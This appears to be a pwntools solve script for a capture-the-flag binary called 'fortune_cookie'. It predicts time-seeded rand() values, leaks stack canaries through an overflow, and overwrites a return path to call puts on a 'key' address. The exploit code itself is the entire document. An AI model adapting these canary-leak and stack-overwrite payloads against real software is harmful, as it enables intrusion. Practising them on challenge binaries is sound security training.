from pwn import *
import ctypes

LIBC = ctypes.cdll.LoadLibrary('libc-2.23.so')

seed = LIBC.time(0)
LIBC.srand(seed)

s = process('./fortune_cookie')
e = ELF('./fortune_cookie')

key = 0x0804a0a0
pr = 0x8048ba6
pppr = 0x8048b89

def recv_menu():
        s.recvuntil("=========================================\n")
        s.recvuntil("=========================================\n")

def guess():
	recv_menu()
	limit = 0xffffffff
	v3 = LIBC.rand()
	v4 = LIBC.rand() * v3
	v5 = LIBC.rand()
	v10 = v4 * v5
	v10 = v10 & limit # guess v10
	#print 'v10         : ' + str(hex(v10))
	return v10

def exploit(string, data, leaked):
	g_canary = 0
	real_canary = 0
	v11 = 0
	s.recvuntil(">")
	s.sendline("1")
	s.recvuntil("Input your string : ")
	s.send(string)
	if data != 0:
		s.recv(0x7e)
		try:
			g_canary = u32(s.recv(4)) # leak g_canary
			#print 'g_canary    : ' + str(hex(g_canary))
			if leaked==0 :
				try:
					real_canary = u32(s.recv(4)) - 0x01 # leak real canary
					#print 'real_canary : ' +str(hex(real_canary))
					try:
						v11 = u32(s.recv(4)) - 0x20
						#print 'v11         : ' + str(hex(v11))
					except:
						pass
				except:
					pass
		except:
			pass
	else:
		pass
	s.recv()
	return [g_canary, real_canary, v11]


leaked = guess()
g_canary, real_canary, v11= exploit('g'*101, 0, 1) # 1 byte overflow in v9 => 0x64 -> 0x67
		
leaked = guess()
g_canary, real_canary, v11 = exploit('g'*104+'\n', 4, 1) # size overflow to 0x67676767

leaked = guess()
g_canary, real_canary, v11 = exploit('g'*104+p32(leaked)+'\x01'+'\n', 8, 0) # leak g_canary, real_canary -> when last digit 0x00 fails

leaked = guess()
exploit('g'*104+p32(leaked)+p32(real_canary)+p32(v11+0x4+0x4)+p32(e.plt['puts'])+p32(0xdeadbeef)+p32(key)+'\n', 8, 1) # overwrite *v11([ecx - 0x4 ])

s.recvuntil(">")
s.sendline("2")
s.recvuntil("Good bye :p")

print s.recv()

s.close()
